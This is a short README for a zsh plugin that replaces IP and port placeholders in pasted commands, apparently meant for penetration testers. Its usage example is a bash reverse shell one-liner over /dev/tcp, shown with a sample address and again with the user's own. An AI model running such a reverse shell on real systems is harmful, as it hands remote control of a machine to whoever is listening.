## Install

### [oh-my-zsh](http://github.com/robbyrussell/oh-my-zsh)
- clone repo inside your oh-my-zsh repo
	```shell
	git clone https://github.com/Ha-L0/zsh-replace-ip-port ${ZSH_CUSTOM:-${ZSH:-~/.oh-my-zsh}/custom}/plugins/zsh-replace-ip-port
	```

- add `zsh-replace-ip-port` to plugins in `~/.zshrc` config
	```
	plugins(... zsh-replace-ip-port
	```

## Usage

```shell
export IP=123.123.123.123 # your ip
export PORT=1111 # your port
```

write or copy paste command with ip and port

```shell
$ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

before executing press `CTRL + o` and ip and port gets replaced

```shell
$ bash -i >& /dev/tcp/123.123.123.123/1111 0>&1
```

